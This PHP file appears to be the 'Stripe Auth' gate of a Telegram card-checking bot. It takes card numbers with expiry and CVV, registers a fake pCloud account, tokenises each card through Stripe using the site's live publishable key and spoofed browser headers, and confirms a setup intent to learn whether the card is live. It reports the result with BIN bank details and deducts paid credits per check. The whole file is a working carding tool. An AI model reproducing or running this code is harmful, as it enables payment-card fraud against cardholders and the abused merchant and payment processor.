<?php
$start_time = microtime(true);

if ($text == '/au') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Stripe Auth (v1) - /au \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < 1) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
include 'Tools/Antispam.php';

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$i = explode("|", $lista);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('mealGBWGDSGDGthamkerxzz987654232'));
$last = ucfirst(str_shuffle('Hackerzzisbestokvai'));
$com = ucfirst(str_shuffle('waifuu'));
$first1 = str_shuffle("Hackerxz34fvHJVDVzbotopvai");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/register');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'termsaccepted=yes&mail='.$first.'%40mail.com&password=qewrvgaervge&os=4&device=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F110.0.0.0+Safari%2F537.36&language=en&ref=50');
$curl1 = curl_exec($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/login');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$first.'%40mail.com&password=qewrvgaervge&deviceid=qiqx4t2s3i5cpyu9llvopyzwnxezqgwlc8lz&language=en&_t=1678086976370&logout=1&getlastsubscription=1&promoinfo=1&os=4&osversion=0.0.0');
$curl2 = curl_exec($ch);
$auth = trim(strip_tags(getStr($curl2,'auth": "','"')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙂𝙤𝙞𝙣𝙜 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'scheme: https',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US',
'content-length: 326',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'time_on_page=234839&pasted_fields=number&guid=NA&muid=d33765a6-6f30-4125-8f3b-d42c7daab6c3a35932&sid=b58a4b89-4b3d-4256-9943-cfa3f23be9ae7d5cee&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]=20'.$year.'&card[name]=Jack+Coddrey');
$curl3 = curl_exec($ch);
$token = trim(strip_tags(getStr($curl3,'id": "','"')));
$status1 = trim(strip_tags(getStr($curl3,'status": "','"')));
$dcode1 = trim(strip_tags(getStr($curl3,'decline_code": "','"')));
$messagee1 = trim(strip_tags(getStr($curl3,'"message": "','",')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#04. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.pcloud.com/billing/stripe/setupintent');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'auth='.$auth.'');
$curl4 = curl_exec($ch);
$setii = trim(strip_tags(getStr($curl4,'clientsecret": "','"')));
$seti = trim(strip_tags(getStr($curl4,'clientsecret": "','_secre')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#05. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti.'/confirm');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'Origin: https://www.pcloud.com',
'Referer: https://www.pcloud.com/',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][token]='.$token.'&payment_method_data[guid]=2431adf2-8fcd-478b-a337-370454913ac5714113&payment_method_data[muid]=d33765a6-6f30-4125-8f3b-d42c7daab6c3a35932&payment_method_data[sid]=b58a4b89-4b3d-4256-9943-cfa3f23be9ae7d5cee&payment_method_data[payment_user_agent]=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&payment_method_data[time_on_page]=238677&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret='.$setii.'');
$curl5 = curl_exec($ch);
$status = trim(strip_tags(getStr($curl5,'status": "','"')));
$dcode = trim(strip_tags(getStr($curl5,'decline_code": "','"')));
$messagee = trim(strip_tags(getStr($curl5,'"message": "','",')));
curl_close($ch);

if (strpos($curl5, 'status": "succeeded'))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl3, 'card_error')) {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee1 - $dcode1 )\n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl3, 'invalid_request_error')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee1 - $dcode1 )\n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl3, 'three_d_secure_redirect')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, '3ds2')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'card_error')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth \n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'requires_payment_method')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth \n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'status": "succeeded')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Stripe Auth Live ( $status )\n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else{
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth \n--» <u>Gateway </u> : Stripe Auth (v1)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);

?>